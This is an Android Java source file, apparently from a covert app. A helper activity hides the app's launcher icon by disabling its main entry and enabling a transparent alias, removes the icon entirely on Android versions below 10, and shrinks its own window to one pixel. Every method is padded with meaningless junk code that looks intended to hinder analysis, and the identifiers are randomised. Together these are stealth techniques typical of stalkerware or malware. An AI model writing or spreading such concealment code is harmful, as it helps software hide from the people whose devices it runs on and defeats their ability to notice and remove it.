package wiux.ixcjc.bkgv;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（EDYW），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class YQTO extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_ldzOctPZcaYztknKX = new java.lang.Object();
        int i_MYtEEJuaSRWKqrOAB = arr_ldzOctPZcaYztknKX.hashCode();
        int j_ZZOAoAbwSTXyngO = new java.util.Random().nextInt(100);
        int tmp_obAjMbsMvkNDg = (i_MYtEEJuaSRWKqrOAB ^ j_ZZOAoAbwSTXyngO) & 0x7FFFFFFF;
        if (tmp_obAjMbsMvkNDg == 18 && i_MYtEEJuaSRWKqrOAB < 72) {
            arr_ldzOctPZcaYztknKX.toString();
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(YQTO.this, EDYW.class.getName(), "wiux.ixcjc.bkgv.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(YQTO.this, "wiux.ixcjc.bkgv.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        String onaCzeCRVM = java.util.UUID.randomUUID().toString();
        int ckuygkzCGKsiNHsxyTS = onaCzeCRVM.length();
        char pmh_mKDqnxqqSVw = onaCzeCRVM.charAt(new java.util.Random().nextInt(ckuygkzCGKsiNHsxyTS));
        boolean dimaIgMYhBJKiKSiik = (pmh_mKDqnxqqSVw == 'z');
        if (dimaIgMYhBJKiKSiik && ckuygkzCGKsiNHsxyTS < 85) {
            onaCzeCRVM.substring(57, 76);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        java.lang.Object arr_ldzOctPZcaYztknKX = new java.lang.Object();
        int i_MYtEEJuaSRWKqrOAB = arr_ldzOctPZcaYztknKX.hashCode();
        int j_ZZOAoAbwSTXyngO = new java.util.Random().nextInt(100);
        int tmp_obAjMbsMvkNDg = (i_MYtEEJuaSRWKqrOAB ^ j_ZZOAoAbwSTXyngO) & 0x7FFFFFFF;
        if (tmp_obAjMbsMvkNDg == 18 && i_MYtEEJuaSRWKqrOAB < 72) {
            arr_ldzOctPZcaYztknKX.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onaCzeCRVM = java.util.UUID.randomUUID().toString();
        int ckuygkzCGKsiNHsxyTS = onaCzeCRVM.length();
        char pmh_mKDqnxqqSVw = onaCzeCRVM.charAt(new java.util.Random().nextInt(ckuygkzCGKsiNHsxyTS));
        boolean dimaIgMYhBJKiKSiik = (pmh_mKDqnxqqSVw == 'z');
        if (dimaIgMYhBJKiKSiik && ckuygkzCGKsiNHsxyTS < 85) {
            onaCzeCRVM.substring(57, 76);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
